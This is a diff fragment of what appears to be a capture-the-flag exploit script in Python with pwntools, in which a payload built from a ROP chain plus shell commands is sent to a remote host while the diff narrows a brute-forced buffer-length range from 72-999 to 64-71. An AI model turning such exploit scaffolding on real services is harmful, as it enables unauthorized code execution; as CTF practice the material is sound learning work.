@@ -15,7 +15,7 @@ def get_payload():
     commands += b"exit\n"
     return ropchain + commands
 
-for length in range(64+8,1000):
+for length in range(64,64+8):
     io = remote(HOST, PORT)
     #io = process("Given/callmemaybe")
 
